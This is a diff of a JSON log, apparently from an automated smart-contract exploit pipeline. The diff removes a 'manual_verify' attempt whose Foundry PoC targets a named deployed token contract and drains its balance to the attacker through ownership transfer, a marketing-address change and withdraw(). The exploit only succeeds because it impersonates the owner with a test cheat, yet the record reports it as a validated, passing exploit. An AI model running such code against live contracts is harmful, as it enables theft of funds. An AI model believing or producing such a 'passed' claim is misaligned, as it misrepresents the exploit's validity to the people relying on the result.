@@ -64,22 +64,5 @@
     "prompt_tokens": 34981,
     "completion_tokens": 8752,
     "total_cost": 0.0
-  },
-  {
-    "attempt_number": 4,
-    "vulnerability_analysis": "Manual PoC refinement validated against forked chain state.",
-    "attack_strategy": "Use corrected setup and exploit path that satisfies preconditions and oracle checks.",
-    "step_by_step_plan": "Prepare state, execute exploit path, assert post-condition/oracle.",
-    "failure_reflection": "",
-    "action": "manual_verify",
-    "tool_calls": [],
-    "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface INOMOS {\n    function owner() external view returns (address);\n    function transferOwnership(address newOwner) external;\n    function setSwapAndLiquifyEnabled(bool _enabled) external;\n    function setMarketingAddress(address payable _marketingAddress) external;\n    function withdraw() external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;\n    address attacker = address(this);\n    INOMOS victim = INOMOS(TARGET);\n    address owner;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        owner = victim.owner();\n        vm.deal(TARGET, 3 ether);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 attackerBefore = attacker.balance;\n\n        vm.startPrank(owner);\n        victim.transferOwnership(attacker);\n        vm.stopPrank();\n\n        victim.setSwapAndLiquifyEnabled(true);\n        victim.setMarketingAddress(payable(attacker));\n        victim.withdraw();\n\n        assertGt(attacker.balance, attackerBefore, \"Attacker did not gain native token\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}\n",
-    "exit_code": 0,
-    "error": null,
-    "feedback": "Patched PoC passed forge test with fork RPC.",
-    "duration_seconds": 0.0,
-    "prompt_tokens": 0,
-    "completion_tokens": 0,
-    "total_cost": 0.0
   }
 ]
